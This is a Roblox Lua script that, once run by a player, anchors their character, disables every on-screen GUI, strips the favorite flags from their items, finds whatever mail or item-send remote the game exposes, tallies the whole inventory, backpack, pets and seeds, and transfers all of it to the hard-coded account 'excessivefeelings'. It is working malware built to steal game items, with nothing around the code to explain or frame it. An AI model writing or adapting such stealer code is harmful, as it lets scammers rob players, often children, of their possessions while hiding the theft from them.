local TARGET = "excessivefeelings"
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")

Humanoid.WalkSpeed = 0
Humanoid.JumpHeight = 0
Humanoid.AutoRotate = false
Humanoid.PlatformStand = true
RootPart.Anchored = true
Character.PrimaryPart = RootPart

game:GetService("RunService").Stepped:Connect(function()
    if RootPart and RootPart.Anchored == false then
        RootPart.Anchored = true
    end
    Humanoid.WalkSpeed = 0
    Humanoid.JumpHeight = 0
end)

for _, gui in pairs(Player.PlayerGui:GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = false
    end
end

local function unfavoriteAll(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("BoolValue") and (obj.Name:lower() == "favorite" or obj.Name:lower() == "fav") then
            obj.Value = false
        end
        if obj:IsA("NumberValue") then
            local fav = obj.Parent:FindFirstChild("Favorite") or obj.Parent:FindFirstChild("favorite")
            if fav and fav:IsA("BoolValue") then
                fav.Value = false
            end
        end
        if obj:IsA("Tool") or obj:IsA("Model") then
            pcall(function()
                obj:SetAttribute("Favorite", false)
            end)
        end
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MailRemote = ReplicatedStorage:FindFirstChild("MailEvent") or
                    ReplicatedStorage:FindFirstChild("SendMail") or
                    ReplicatedStorage:FindFirstChild("SendItem") or
                    ReplicatedStorage:FindFirstChild("MailSend")

if not MailRemote then
    for _, child in pairs(ReplicatedStorage:GetChildren()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            MailRemote = child
            break
        end
    end
end

if not MailRemote then
    local folders = {"Remotes", "Events", "Remote", "Network"}
    for _, folderName in pairs(folders) do
        local folder = ReplicatedStorage:FindFirstChild(folderName)
        if folder then
            for _, child in pairs(folder:GetChildren()) do
                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    MailRemote = child
                    break
                end
            end
        end
        if MailRemote then break end
    end
end

local function sendItem(target, itemName, quantity)
    if not MailRemote then
        return
    end
    pcall(function()
        if MailRemote:IsA("RemoteFunction") then
            MailRemote:InvokeServer(target, itemName, quantity)
        else
            MailRemote:FireServer(target, itemName, quantity)
        end
    end)
end

local itemCounts = {}

local function scanContainer(container)
    if not container then return end
    unfavoriteAll(container)
    for _, obj in pairs(container:GetDescendants()) do
        if obj:IsA("NumberValue") and obj.Value > 0 then
            local itemName = obj.Parent.Name
            itemCounts[itemName] = (itemCounts[itemName] or 0) + obj.Value
        end
        if obj:IsA("Tool") or obj:IsA("Model") then
            if obj.Parent == Player.Backpack or obj.Parent == Character then
                itemCounts[obj.Name] = (itemCounts[obj.Name] or 0) + 1
            end
        end
        if obj:IsA("Folder") then
            local count = 0
            for _, child in pairs(obj:GetChildren()) do
                if child:IsA("NumberValue") and child.Value > 0 then
                    count = count + child.Value
                end
            end
            if count > 0 then
                itemCounts[obj.Name] = (itemCounts[obj.Name] or 0) + count
            end
        end
    end
end

scanContainer(Player:FindFirstChild("PlayerData"))
scanContainer(Player:FindFirstChild("Data"))
scanContainer(workspace:FindFirstChild(Player.Name))
scanContainer(Player.Backpack)
scanContainer(Character)

local extraFolders = {"Inventory", "Items", "Pets", "Seeds", "BackpackData"}
for _, folderName in pairs(extraFolders) do
    local folder = Player:FindFirstChild(folderName)
    if folder then
        scanContainer(folder)
    end
end

for itemName, quantity in pairs(itemCounts) do
    if quantity > 0 then
        sendItem(TARGET, itemName, quantity)
        wait(0.1)
    end
end
`
